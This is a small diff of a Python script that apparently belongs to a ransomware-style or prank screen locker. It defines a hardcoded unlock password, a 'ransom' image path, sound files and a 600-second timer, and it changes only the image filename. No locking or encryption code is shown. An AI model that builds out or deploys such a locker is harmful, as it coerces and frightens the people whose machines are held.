@@ -10,7 +10,7 @@ import subprocess
 PASSWORD = "Xy7Lz29#AbC15"
 
 home = os.path.expanduser("~")
-FOTO_RANSOM = os.path.join(home, "TRYts/TRYts/IMG-20250120-WA0033.jpg")
+FOTO_RANSOM = os.path.join(home, "TRYts/TRYts/IMG_20260324_083856.jpg")
 SOUND_FILE_1 = os.path.join(home, "TRYts/TRYts/ssstik.io_1774317327386.mp3")
 SOUND_FILE_2 = os.path.join(home, "TRYts/TRYts/AUD-20250503-WA0009.mp3")
 TIMER_SECONDS = 600
